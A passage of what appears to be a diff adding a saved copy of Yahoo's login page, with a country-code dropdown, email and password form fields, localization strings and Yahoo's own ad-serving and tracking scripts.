+               <option corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="US Virgin Islands" value="1" data-country-intl="vi">
+                US Virgin Islands ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Uganda" value="256" data-country-intl="ug">
+                Uganda ‪(+256)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Ukraine" value="380" data-country-intl="ua">
+                Ukraine ‪(+380)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="United Arab Emirates" value="971" data-country-intl="ae">
+                United Arab Emirates ‪(+971)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="United Kingdom" value="44" data-country-intl="uk">
+                United Kingdom ‪(+44)‬
+               </option>
+               <option selected="selected" corresponding-field-data-format="(XXX) XXX-XXXX" aria-label="United States" value="1" data-country-intl="us">
+                United States ‪(+1)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Uruguay" value="598" data-country-intl="uy">
+                Uruguay ‪(+598)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Uzbekistan" value="998" data-country-intl="uz">
+                Uzbekistan ‪(+998)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Vanuatu" value="678" data-country-intl="vu">
+                Vanuatu ‪(+678)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Vatican City State" value="39" data-country-intl="va">
+                Vatican City State ‪(+39)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Venezuela" value="58" data-country-intl="ve">
+                Venezuela ‪(+58)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Vietnam" value="84" data-country-intl="vn">
+                Vietnam ‪(+84)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Wallis and Futuna" value="681" data-country-intl="wf">
+                Wallis and Futuna ‪(+681)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Yemen" value="967" data-country-intl="ye">
+                Yemen ‪(+967)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Zambia" value="260" data-country-intl="zm">
+                Zambia ‪(+260)‬
+               </option>
+               <option corresponding-field-data-format="" aria-label="Zimbabwe" value="263" data-country-intl="zw">
+                Zimbabwe ‪(+263)‬
+               </option>
+              </select>
+              <noscript>
+               &lt;/div&gt;
+              </noscript>
+             </div>
+             <!-- username -->
+             <label class="mbr-hide" for="login-username">
+              Username
+             </label>
+             <input type="text" autofocus="" spellcheck="false" autocorrect="off" title="Email address" placeholder="Email address" value="" aria-required="true" tabindex="1" maxlength="96" class="login-input pure-u-1 " id="login-username" name="username" />
+             <div role="alert" class="error-box username-error pure-u-1 mbr-text-align mbr-hide" id="login-username-error">
+             </div>
+            </div>
+            <div class="mbr-login-username-tips">
+            </div>
+            <div class="passwd-field " id="passwd-field">
+             <label class="mbr-hide" for="login-passwd">
+              Password
+             </label>
+             <input type="password" autocorrect="off" title="Password" placeholder="Password" aria-required="true" tabindex="2" maxlength="64" class="login-input  pure-u-1" id="login-passwd" name="passwd" />
+             <div class="odp-pw-desc mbr-text-align mbr-hide" id="odp-pw-desc">
+              Click Continue to receive an on-demand password.
+             </div>
+            </div>
+           </div>
+           <div class="mbr-login-error mbr-text-align pure-u-1 mbr-hide" id="mbr-login-error">
+           </div>
+           <div class="mbr-checkbox " id="persistency">
+            <div class="mbr-text-align mbr-login-text-normal">
+             <input type="checkbox" checked="checked" tabindex="3" class="checkbox" value="y" name=".persistent" id="persistent" />
+             <label for="persistent">
+              Keep me signed in
+             </label>
+            </div>
+           </div>
+           <div class="mbr-login-submit " id="submits">
+            <button tabindex="4" value="" class="pure-u-1 pure-button mbr-button-primary" type="submit" name="signin" id="login-signin">
+             Sign In
+            </button>
+           </div>
+           <div class="hidden" id="hiddens">
+            <input type="hidden" value="YGQmvOdVrkQ" name="_crumb" />
+            <input type="hidden" value="1441173127" name="_ts" />
+            <input type="hidden" value="" name="_format" />
+            <input type="hidden" value="xGoMh6QIyiP9" name="_uuid" />
+            <input type="hidden" value="2" name="_seqid" />
+            <input type="hidden" value="" name="otp_channel" />
+           </div>
+           <!-- popup -->
+           <div class="mbr-login-popup-container">
+            <div class="mbr-login-popup mbr-hide" id="mbr-login-popup">
+             <div class="yui3-widget-hd mbr-text-align">
+             </div>
+             <div class="yui3-widget-bd mbr-text-align pure-g">
+             </div>
+            </div>
+           </div>
+          </form>
+          <div class="mbr-hide" id="yahoo-japan-container">
+           <a class="pure-u-1 pure-button mbr-button-primary" href="http://www.yahoo-help.jp/app/answers/detail/p/565/a_id/47713?soc_src=mail&soc_trk=ma">
+            Visit Yahoo Help
+           </a>
+           <div class="mbr-login-oauth2-yahoo-japan-msg">
+            Yahoo Japan users - please visit Yahoo Help to learn how to add your email address.
+           </div>
+          </div>
+         </fieldset>
+         <div class="mbr-login-help-links mbr-text-align mbr-login-text-normal ">
+          <a class="pure-u-1 mbr-hide" href="/config/login?.src=fpctx&.intl=xe&.lang=en-JO&.done=https%3A%2F%2Fen-maktoob.yahoo.com%2F%3Fp%3Dus&.otp=y" id="otpLnk">
+           MBR_OTP_SIGNIN_USING_MOBILE_NUMBER
+          </a>
+          <a class="mbr-login-forgot-link pure-u-1" href="https://edit.yahoo.com/config/eval_forgot_pw?lang=en-JO&intl=xe&done=https%3A%2F%2Fen-maktoob.yahoo.com%2F%3Fp%3Dus" id="forgotLnk">
+           Can't access your account?
+          </a>
+          <a class="mbr-login-help-link pure-u-1" href="/config/login?.src=fpctx&.intl=xe&.lang=en-JO&.done=https%3A%2F%2Fen-maktoob.yahoo.com%2F%3Fp%3Dus&.help=1" id="helpLnk">
+           Help
+          </a>
+         </div>
+         <div class="mbr-login-create-account mbr-login-partner- pure-g">
+          <!--<div class="mbr-login-separator-title pure-u-1"><span class="mbr-separator-or">OR</span></div>-->
+          <div class="pure-u-1">
+           <p>
+            New to Yahoo?
+           </p>
+           <p>
+            <a id="login-signup" href="https://edit.yahoo.com/registration?.lang=en-JO&.intl=xe&.done=https%3A%2F%2Fen-maktoob.yahoo.com%2F%3Fp%3Dus&.src=fpctx">
+             Sign up for a new account
+            </a>
+           </p>
+          </div>
+         </div>
+        </div>
+       </div>
+       <!-- localization strings  -->
+       <div class="mbr-hide">
+        ",
+
+            error_incident_mobile_email : "Please enter a valid Mobile Number or Email Address that you currently have access to.",
+            error_incident_email : "Please enter a valid non-Yahoo Email address that you currently have access to.",
+            error_incident_mobile : "Please enter a valid US mobile number that you currently have access to.",
+
+            error_invalid_auth: "Invalid ID or password.
+        <div class='\"mbr-text-normal\"'>
+         Please try again using your full Yahoo ID.
+        </div>
+        ",
+            error_invalid_pw: "Please enter your password",
+
+            error_empty_pwqa: "No answer provided. Please try again.",
+            error_empty_code: "Please enter the verification code to continue",
+
+            error_empty_phone_number: "Please enter your phone number.",
+
+            end_of_string: "EOS"
+        };
+
+        MBR_config.strings.otp = MBR_config.strings.otp || {
+            placeholder_mobile_number: "Mobile number",
+            placeholder_username : "Email address",
+            sign_in: "Sign In",
+            get_my_passwd: "Continue",
+            signin_continue: "Continue",
+            odp_passwd_desc: "Click Continue to receive an on-demand password.",
+            odp_push_desc: "Click Continue to use Account Key.",
+            error_invalid_passwd: "That didn�t work. Please type your on-demand password again.",
+            error_empty_passwd: "Your on-demand password is required.",
+            retry_message: "Please wait {0} seconds before trying to resend.",
+            retry_message_one: "Please wait a second before trying to resend.",
+
+            end_of_string: "EOS"
+        };
+
+        MBR_config.otp_enabled =  false;
+        MBR_config.otp_optin = true;
+
+                MBR_config.account_switch_enabled = true;
+        MBR_config.is_oauth2 = false;
+
+        MBR_config.strings.sign_in = "Sign In";
+
+                MBR_config.use_odp_username_monitor = false;
+        MBR_config.hide_left_content = false;
+       </div>
+      </div>
+      <div class="mbr-login-c-left pure-u" id="mbr-login-contents-container" style="display: block;">
+       <script>
+        (function(){document.getElementById('mbr-login-contents-container').style.display='none';}());
+       </script>
+       <!-- left content -->
+       <div class="mbr-login-contents pure-u pure-u-1" id="mbr-login-contents">
+        <div class="info">
+         <h3>
+          Yahoo makes it easy to enjoy what matters in your world.
+         </h3>
+         <p>
+          Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and  more. You get more out of the web, you get more out of life.
+         </p>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="mbr-hide" id="mbr-login-full-contents">
+     </div>
+     <!-- ads widget -->
+     <div class="mbr-login-ads pure-u-1" id="mbr-login-ad-container">
+      <div class="mbr-login-ads-outer">
+       <div class="mbr-login-ads-inner">
+        <div id="mbr-login-ad-rich" style="width: 100%; text-align: center; margin-left: auto; margin-right: auto; display: inline-block; visibility: visible;">
+         <div id="mbr-login-ad-rich-frame">
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+     <script _ver="2-8-9" id="processed_fc_1_1452652900082_71" type="text/x-safeframe-processed">
+      { "positions": [ { "html": "&lt;!-- SpaceID=360872528 loc=FOOT9 noad --&gt;&lt;!-- fac-gd2-noad --&gt;&lt;!-- gd2-status-10 --&gt;&lt;!--QYZ FAC_EMBARGO_COUNTRY,,10.200.18.62;;FOOT9;360872528;10--&gt;", "id": "FOOT9", "meta": { "y": { "cscHTML": "", "cscURI": "", "impID": "", "supp_ugc": "0", "placementID": "-1", "creativeID": "-1", "serveTime": "-1", "behavior": "non_exp", "adID": "#1", "matchID": "#1", "err": "noad", "hasExternal": 0, "size": "", "bookID": "-1", "serveType": "-1", "slotID": "1", "fdb": "{ \"fdb_url\": \"http:\\/\\/gd1457.adx.gq1.yahoo.com\\/af?bv=1.0.0&amp;bs=(15ir45r6b(gid$jmTVQDk4LjHHbFsHU5jMkgKkMTAuNwAAAACljpkK,st$1402537233026922,srv$1,si$13303551,adv$25941429036,ct$25,li$3239250051,exp$1402544433026922,cr$4154984551,pbid$25372728133,v$1.0))&amp;al=(type${type},cmnt${cmnt},subo${subo})&amp;r=10\", \"fdb_on\": \"1\", \"fdb_exp\": \"1402544433026\", \"fdb_intl\": \"en-us\" , \"d\" : \"1\" }", "slotData": "{\"pt\":\"0\",\"bamt\":\"10000000000.000000\",\"namt\":\"0.000000\",\"isLiveAdPreview\":\"false\",\"is_ad_feedback\":\"false\",\"isCompAds\":\"false\",\"pvid\":\"5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.\"}", "adc": "{\"label\":\"AdChoices\",\"url\":\"https:\\/\\/info.yahoo.com\\/privacy\\/us\\/yahoo\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}", "is3rd": "0" } } },{ "html": "&lt;!-- SpaceID=360872528 loc=FOOT noad --&gt;&lt;!-- fac-gd2-noad --&gt;&lt;!-- gd2-status-10 --&gt;&lt;!--QYZ FAC_EMBARGO_COUNTRY,,10.200.18.62;;FOOT;360872528;10--&gt;", "id": "FOOT", "meta": { "y": { "cscHTML": "&lt;scr"+"ipt language=javascr"+"ipt&gt;\nif(window.xzq_d==null)window.xzq_d=new Object();\nwindow.xzq_d['wDqtsArIEiw-']='(as$125soc2vv,aid$wDqtsArIEiw-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=FOOT)';\n&lt;/scr"+"ipt&gt;&lt;noscr"+"ipt&gt;&lt;img width=1 height=1 alt=\"\" src=\"https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&amp;bs=(135tcvuo9(gid$5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.,st$1441173128052987,si$4349032,sp$360872528,pv$1,v$2.0))&amp;t=J_3-DR_3&amp;al=(as$125soc2vv,aid$wDqtsArIEiw-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=FOOT)\"&gt;&lt;/noscr"+"ipt&gt;", "cscURI": "https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&amp;bs=(135tcvuo9(gid$5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.,st$1441173128052987,si$4349032,sp$360872528,pv$1,v$2.0))&amp;t=J_3-DR_3&amp;al=(as$125soc2vv,aid$wDqtsArIEiw-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=FOOT)", "impID": "", "supp_ugc": "0", "placementID": "-1", "creativeID": "-1", "serveTime": "1441173128052987", "behavior": "non_exp", "adID": "#1", "matchID": "#1", "err": "noad", "hasExternal": 0, "size": "", "bookID": "-1", "serveType": "-1", "slotID": "0", "fdb": "{ \"fdb_url\": \"http:\\/\\/gd1457.adx.gq1.yahoo.com\\/af?bv=1.0.0&amp;bs=(15ir45r6b(gid$jmTVQDk4LjHHbFsHU5jMkgKkMTAuNwAAAACljpkK,st$1402537233026922,srv$1,si$13303551,adv$25941429036,ct$25,li$3239250051,exp$1402544433026922,cr$4154984551,pbid$25372728133,v$1.0))&amp;al=(type${type},cmnt${cmnt},subo${subo})&amp;r=10\", \"fdb_on\": \"1\", \"fdb_exp\": \"1402544433026\", \"fdb_intl\": \"en-us\" , \"d\" : \"1\" }", "slotData": "{\"pt\":\"0\",\"bamt\":\"10000000000.000000\",\"namt\":\"0.000000\",\"isLiveAdPreview\":\"false\",\"is_ad_feedback\":\"false\",\"isCompAds\":\"false\",\"pvid\":\"5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.\"}", "adc": "{\"label\":\"AdChoices\",\"url\":\"https:\\/\\/info.yahoo.com\\/privacy\\/us\\/yahoo\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}", "is3rd": "0" } } },{ "html": "&lt;!-- SpaceID=360872528 loc=RICH noad --&gt;&lt;!-- fac-gd2-noad --&gt;&lt;!-- gd2-status-10 --&gt;&lt;!--QYZ FAC_EMBARGO_COUNTRY,,10.200.18.62;;RICH;360872528;10--&gt;", "id": "RICH", "meta": { "y": { "cscHTML": "&lt;scr"+"ipt language=javascr"+"ipt&gt;\nif(window.xzq_d==null)window.xzq_d=new Object();\nwindow.xzq_d['FKGtsArIEiw-']='(as$125iadt37,aid$FKGtsArIEiw-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)';\n&lt;/scr"+"ipt&gt;&lt;noscr"+"ipt&gt;&lt;img width=1 height=1 alt=\"\" src=\"https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&amp;bs=(135tcvuo9(gid$5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.,st$1441173128052987,si$4349032,sp$360872528,pv$1,v$2.0))&amp;t=J_3-DR_3&amp;al=(as$125iadt37,aid$FKGtsArIEiw-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)\"&gt;&lt;/noscr"+"ipt&gt;", "cscURI": "https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&amp;bs=(135tcvuo9(gid$5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.,st$1441173128052987,si$4349032,sp$360872528,pv$1,v$2.0))&amp;t=J_3-DR_3&amp;al=(as$125iadt37,aid$FKGtsArIEiw-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)", "impID": "", "supp_ugc": "0", "placementID": "-1", "creativeID": "-1", "serveTime": "1441173128052987", "behavior": "non_exp", "adID": "#1", "matchID": "#1", "err": "noad", "hasExternal": 0, "size": "", "bookID": "-1", "serveType": "-1", "slotID": "2", "fdb": "{ \"fdb_url\": \"http:\\/\\/gd1457.adx.gq1.yahoo.com\\/af?bv=1.0.0&amp;bs=(15ir45r6b(gid$jmTVQDk4LjHHbFsHU5jMkgKkMTAuNwAAAACljpkK,st$1402537233026922,srv$1,si$13303551,adv$25941429036,ct$25,li$3239250051,exp$1402544433026922,cr$4154984551,pbid$25372728133,v$1.0))&amp;al=(type${type},cmnt${cmnt},subo${subo})&amp;r=10\", \"fdb_on\": \"1\", \"fdb_exp\": \"1402544433026\", \"fdb_intl\": \"en-us\" , \"d\" : \"1\" }", "slotData": "{\"pt\":\"0\",\"bamt\":\"10000000000.000000\",\"namt\":\"0.000000\",\"isLiveAdPreview\":\"false\",\"is_ad_feedback\":\"false\",\"isCompAds\":\"false\",\"pvid\":\"5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.\"}", "adc": "{\"label\":\"AdChoices\",\"url\":\"https:\\/\\/info.yahoo.com\\/privacy\\/us\\/yahoo\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}", "is3rd": "0" } } } ], "meta": { "y": { "pageEndHTML": "&lt;scr"+"ipt language=javascr"+"ipt&gt;\n(function(){window.xzq_p=function(R){M=R};window.xzq_svr=function(R){J=R};function F(S){var T=document;if(T.xzq_i==null){T.xzq_i=new Array();T.xzq_i.c=0}var R=T.xzq_i;R[++R.c]=new Image();R[R.c].src=S}window.xzq_sr=function(){var S=window;var Y=S.xzq_d;if(Y==null){return }if(J==null){return }var T=J+M;if(T.length&gt;P){C();return }var X=\"\";var U=0;var W=Math.random();var V=(Y.hasOwnProperty!=null);var R;for(R in Y){if(typeof Y[R]==\"string\"){if(V&amp;&amp;!Y.hasOwnProperty(R)){continue}if(T.length+X.length+Y[R].length&lt;=P){X+=Y[R]}else{if(T.length+Y[R].length&gt;P){}else{U++;N(T,X,U,W);X=Y[R]}}}}if(U){U++}N(T,X,U,W);C()};function N(R,U,S,T){if(U.length&gt;0){R+=\"&amp;al=\"}F(R+U+\"&amp;s=\"+S+\"&amp;r=\"+T)}function C(){window.xzq_d=null;M=null;J=null}function K(R){xzq_sr()}function B(R){xzq_sr()}function L(U,V,W){if(W){var R=W.toString();var T=U;var Y=R.match(new RegExp(\"\\\\\\\\(([^\\\\\\\\)]*)\\\\\\\\)\"));Y=(Y[1].length&gt;0?Y[1]:\"e\");T=T.replace(new RegExp(\"\\\\\\\\([^\\\\\\\\)]*\\\\\\\\)\",\"g\"),\"(\"+Y+\")\");if(R.indexOf(T)&lt;0){var X=R.indexOf(\"{\");if(X&gt;0){R=R.substring(X,R.length)}else{return W}R=R.replace(new RegExp(\"([^a-zA-Z0-9$_])this([^a-zA-Z0-9$_])\",\"g\"),\"$1xzq_this$2\");var Z=T+\";var rv = f( \"+Y+\",this);\";var S=\"{var a0 = '\"+Y+\"';var ofb = '\"+escape(R)+\"' ;var f = new Function( a0, 'xzq_this', unescape(ofb));\"+Z+\"return rv;}\";return new Function(Y,S)}else{return W}}return V}window.xzq_eh=function(){if(E||I){this.onload=L(\"xzq_onload(e)\",K,this.onload,0);if(E&amp;&amp;typeof (this.onbeforeunload)!=O){this.onbeforeunload=L(\"xzq_dobeforeunload(e)\",B,this.onbeforeunload,0)}}};window.xzq_s=function(){setTimeout(\"xzq_sr()\",1)};var J=null;var M=null;var Q=navigator.appName;var H=navigator.appVersion;var G=navigator.userAgent;var A=parseInt(H);var D=Q.indexOf(\"Microsoft\");var E=D!=-1&amp;&amp;A&gt;=4;var I=(Q.indexOf(\"Netscape\")!=-1||Q.indexOf(\"Opera\")!=-1)&amp;&amp;A&gt;=4;var O=\"undefined\";var P=2000})();\n&lt;/scr"+"ipt&gt;&lt;scr"+"ipt language=javascr"+"ipt&gt;\nif(window.xzq_svr)xzq_svr('https://csc.beap.bc.yahoo.com/');\nif(window.xzq_p)xzq_p('yi?bv=1.0.0&amp;bs=(135tcvuo9(gid$5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.,st$1441173128052987,si$4349032,sp$360872528,pv$1,v$2.0))&amp;t=J_3-DR_3');\nif(window.xzq_s)xzq_s();\n&lt;/scr"+"ipt&gt;&lt;noscr"+"ipt&gt;&lt;img width=1 height=1 alt=\"\" src=\"https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&amp;bs=(135tcvuo9(gid$5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.,st$1441173128052987,si$4349032,sp$360872528,pv$1,v$2.0))&amp;t=J_3-DR_3\"&gt;&lt;/noscr"+"ipt&gt;&lt;scr"+"ipt&gt;(function(c){var d=\"https://\",a=c&amp;&amp;c.JSON,e=\"ypcdb\",g=document,b;function j(n,q,p,o){var m,r;try{m=new Date();m.setTime(m.getTime()+o*1000);g.cookie=[n,\"=\",encodeURIComponent(q),\"; domain=\",p,\"; path=/; max-age=\",o,\"; expires=\",m.toUTCString()].join(\"\")}catch(r){}}function k(m){return function(){i(m)}}function i(n){var m,o;try{m=new Image();m.onerror=m.onload=function(){m.onerror=m.onload=null;m=null};m.src=n}catch(o){}}function f(o){var p=\"\",n,s,r,q;if(o){try{n=o.match(/^https?:\\/\\/([^\\/\\?]*)(yahoo\\.com|yimg\\.com|flickr\\.com|yahoo\\.net|rivals\\.com)(:\\d+)?([\\/\\?]|$)/);if(n&amp;&amp;n[2]){p=n[2]}n=(n&amp;&amp;n[1])||null;s=n?n.length-1:-1;r=n&amp;&amp;s&gt;=0?n[s]:null;if(r&amp;&amp;r!=\".\"&amp;&amp;r!=\"/\"){p=\"\"}}catch(q){p=\"\"}}return p}function l(B,n,q,m,p){var u,s,t,A,r,F,z,E,C,y,o,D,x,v=1000,w=v;try{b=location}catch(z){b=null}try{if(a){C=a.parse(p)}else{y=new Function(\"return \"+p);C=y()}}catch(z){C=null}if(y){y=null}try{s=b.hostname;t=b.protocol;if(t){t+=\"//\"}}catch(z){s=t=\"\"}if(!s){try{A=g.URL||b.href||\"\";r=A.match(/^((http[s]?)\\:[\\/]+)?([^:\\/\\s]+|[\\:\\dabcdef\\.]+)/i);if(r&amp;&amp;r[1]&amp;&amp;r[3]){t=r[1]||\"\";s=r[3]||\"\"}}catch(z){t=s=\"\"}}if(!s||!C||!t||!q){return}A=g.URL||b.href||\"\";E=f(A);if(!E||g.cookie.indexOf(\"ypcdb=\"+n)&gt;-1){return}if(t===d){q=m}u=0;while(F=q[u++]){o=F.lastIndexOf(\"=\");if(o!=-1){D=F.substr(1+o);x=C[D];if(x){setTimeout(k(t+F+x),w);w+=v}}}u=0;while(F=B[u++]){setTimeout(k(t+F),w);w+=v}setTimeout(function(){j(e,n,E,86400)},w)}function h(){l(['ads.yahoo.com/get-user-id?ver=2&amp;s=800000004&amp;type=redirect&amp;ts=1441173128&amp;sig=e2d260b2dd8cb1bc','ads.yahoo.com/get-user-id?ver=2&amp;s=800000008&amp;type=redirect&amp;ts=1441173128&amp;sig=0ab4d8a6317a64f6'],'bf8caa76bebf7030a06694ea67d12a2b',['csync.flickr.com/csync?ver=2.1','csync.yahooapis.com/csync?ver=2.1'],['csync.flickr.com/csync?ver=2.1','csync.yahooapis.com/csync?ver=2.1'],'{\"2.1\":\"&amp;id=23351&amp;value=9ffwz4unhpsgw%26o%3d4%26q%3dAXvRTBOcLSyZ3vSUsFGA861x7_H-%26f%3dx2%26v%3d2ZsXa8tUXjK2NNtrAr7L&amp;optout=h%3d1&amp;timeout=1441173128&amp;sig=13j4k6llf\"}')}if(c.addEventListener){c.addEventListener(\"load\",h,false)}else{if(c.attachEvent){c.attachEvent(\"onload\",h)}else{c.onload=h}}})(window);\n&lt;/scr"+"ipt&gt;", "pos_list": [ "FOOT9","FOOT","RICH" ], "filtered": [  ], "spaceID": "360872528", "host": "login.yahoo.com", "lookupTime": "37", "k2_uri": "", "fac_rt": "33256", "serveTime":"1441173128052987", "pvid": "5506szE4OC6ecnYkVeY_swZPNDYuMgAAAABEWpI.", "tID": "darla_prefetch_1441173128053_952271818_1", "npv": "0", "ep": "{\"filter\":\"no_expandable;exp_iframe_expandable;\",\"secure\":true,\"ref\":\"https:\\/\\/login.yahoo.com\",\"darlaID\":\"darla_instance_1441173128053_973029116_0\"}", "pe": "CWZ1bmN0aW9uIGRwZWQoKSB7IAoJaWYod2luZG93Lnh6cV9kPT1udWxsKXdpbmRvdy54enFfZD1uZXcgT2JqZWN0KCk7CndpbmRvdy54enFfZFsnd0RxdHNBcklFaXctJ109JyhhcyQxMjVzb2MydnYsYWlkJHdEcXRzQXJJRWl3LSxjciQtMSxjdCQyNSxhdCRILGVvYiRnZDFfbWF0Y2hfaWQ9LTE6eXBvcz1GT09UKSc7aWYod2luZG93Lnh6cV9kPT1udWxsKXdpbmRvdy54enFfZD1uZXcgT2JqZWN0KCk7CndpbmRvdy54enFfZFsnRktHdHNBcklFaXctJ109JyhhcyQxMjVpYWR0MzcsYWlkJEZLR3RzQXJJRWl3LSxjciQtMSxjdCQyNSxhdCRILGVvYiRnZDFfbWF0Y2hfaWQ9LTE6eXBvcz1SSUNIKSc7CgkJIH07CmRwZWQudHJhbnNJRCA9ICJkYXJsYV9wcmVmZXRjaF8xNDQxMTczMTI4MDUzXzk1MjI3MTgxOF8xIjsKCglmdW5jdGlvbiBkcGVyKCkgeyAKCQppZih3aW5kb3cueHpxX3N2cil4enFfc3ZyKCdodHRwczovL2NzYy5iZWFwLmJjLnlhaG9vLmNvbS8nKTsKaWYod2luZG93Lnh6cV9wKXh6cV9wKCd5aT9idj0xLjAuMCZicz0oMTM1dGN2dW85KGdpZCQ1NTA2c3pFNE9DNmVjbllrVmVZX3N3WlBORFl1TWdBQUFBQkVXcEkuLHN0JDE0NDExNzMxMjgwNTI5ODcsc2kkNDM0OTAzMixzcCQzNjA4NzI1MjgscHYkMSx2JDIuMCkpJnQ9Sl8zLURSXzMnKTsKaWYod2luZG93Lnh6cV9zKXh6cV9zKCk7CgoKCShmdW5jdGlvbihjKXt2YXIgZD0iaHR0cHM6Ly8iLGE9YyYmYy5KU09OLGU9InlwY2RiIixnPWRvY3VtZW50LGI7ZnVuY3Rpb24gaihuLHEscCxvKXt2YXIgbSxyO3RyeXttPW5ldyBEYXRlKCk7bS5zZXRUaW1lKG0uZ2V0VGltZSgpK28qMTAwMCk7Zy5jb29raWU9W24sIj0iLGVuY29kZVVSSUNvbXBvbmVudChxKSwiOyBkb21haW49IixwLCI7IHBhdGg9LzsgbWF4LWFnZT0iLG8sIjsgZXhwaXJlcz0iLG0udG9VVENTdHJpbmcoKV0uam9pbigiIil9Y2F0Y2gocil7fX1mdW5jdGlvbiBrKG0pe3JldHVybiBmdW5jdGlvbigpe2kobSl9fWZ1bmN0aW9uIGkobil7dmFyIG0sbzt0cnl7bT1uZXcgSW1hZ2UoKTttLm9uZXJyb3I9bS5vbmxvYWQ9ZnVuY3Rpb24oKXttLm9uZXJyb3I9bS5vbmxvYWQ9bnVsbDttPW51bGx9O20uc3JjPW59Y2F0Y2gobyl7fX1mdW5jdGlvbiBmKG8pe3ZhciBwPSIiLG4scyxyLHE7aWYobyl7dHJ5e249by5tYXRjaCgvXmh0dHBzPzpcL1wvKFteXC9cP10qKSh5YWhvb1wuY29tfHlpbWdcLmNvbXxmbGlja3JcLmNvbXx5YWhvb1wubmV0fHJpdmFsc1wuY29tKSg6XGQrKT8oW1wvXD9dfCQpLyk7aWYobiYmblsyXSl7cD1uWzJdfW49KG4mJm5bMV0pfHxudWxsO3M9bj9uLmxlbmd0aC0xOi0xO3I9biYmcz49MD9uW3NdOm51bGw7aWYociYmciE9Ii4iJiZyIT0iLyIpe3A9IiJ9fWNhdGNoKHEpe3A9IiJ9fXJldHVybiBwfWZ1bmN0aW9uIGwoQixuLHEsbSxwKXt2YXIgdSxzLHQsQSxyLEYseixFLEMseSxvLEQseCx2PTEwMDAsdz12O3RyeXtiPWxvY2F0aW9ufWNhdGNoKHope2I9bnVsbH10cnl7aWYoYSl7Qz1hLnBhcnNlKHApfWVsc2V7eT1uZXcgRnVuY3Rpb24oInJldHVybiAiK3ApO0M9eSgpfX1jYXRjaCh6KXtDPW51bGx9aWYoeSl7eT1udWxsfXRyeXtzPWIuaG9zdG5hbWU7dD1iLnByb3RvY29sO2lmKHQpe3QrPSIvLyJ9fWNhdGNoKHope3M9dD0iIn1pZighcyl7dHJ5e0E9Zy5VUkx8fGIuaHJlZnx8IiI7cj1BLm1hdGNoKC9eKChodHRwW3NdPylcOltcL10rKT8oW146XC9cc10rfFtcOlxkYWJjZGVmXC5dKykvaSk7aWYociYmclsxXSYmclszXSl7dD1yWzFdfHwiIjtzPXJbM118fCIifX1jYXRjaCh6KXt0PXM9IiJ9fWlmKCFzfHwhQ3x8IXR8fCFxKXtyZXR1cm59QT1nLlVSTHx8Yi5ocmVmfHwiIjtFPWYoQSk7aWYoIUV8fGcuY29va2llLmluZGV4T2YoInlwY2RiPSIrbik+LTEpe3JldHVybn1pZih0PT09ZCl7cT1tfXU9MDt3aGlsZShGPXFbdSsrXSl7bz1GLmxhc3RJbmRleE9mKCI9Iik7aWYobyE9LTEpe0Q9Ri5zdWJzdHIoMStvKTt4PUNbRF07aWYoeCl7c2V0VGltZW91dChrKHQrRit4KSx3KTt3Kz12fX19dT0wO3doaWxlKEY9Qlt1KytdKXtzZXRUaW1lb3V0KGsodCtGKSx3KTt3Kz12fXNldFRpbWVvdXQoZnVuY3Rpb24oKXtqKGUsbixFLDg2NDAwKX0sdyl9ZnVuY3Rpb24gaCgpe2woWydhZHMueWFob28uY29tL2dldC11c2VyLWlkP3Zlcj0yJnM9ODAwMDAwMDA0JnR5cGU9cmVkaXJlY3QmdHM9MTQ0MTE3MzEyOCZzaWc9ZTJkMjYwYjJkZDhjYjFiYycsJ2Fkcy55YWhvby5jb20vZ2V0LXVzZXItaWQ/dmVyPTImcz04MDAwMDAwMDgmdHlwZT1yZWRpcmVjdCZ0cz0xNDQxMTczMTI4JnNpZz0wYWI0ZDhhNjMxN2E2NGY2J10sJ2JmOGNhYTc2YmViZjcwMzBhMDY2OTRlYTY3ZDEyYTJiJyxbJ2NzeW5jLmZsaWNrci5jb20vY3N5bmM/dmVyPTIuMScsJ2NzeW5jLnlhaG9vYXBpc